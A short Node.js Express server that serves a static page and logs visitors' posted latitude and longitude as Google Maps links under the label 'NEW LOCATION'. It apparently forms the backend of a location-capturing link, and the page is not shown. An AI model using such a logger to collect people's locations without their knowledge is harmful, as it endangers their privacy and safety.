const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public')); // Serves your HTML file

app.post('/log-location', (req, res) => {
    const { lat, lng } = req.body;
    console.log(`NEW LOCATION: https://www.google.com/maps?q=${lat},${lng}`);
    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
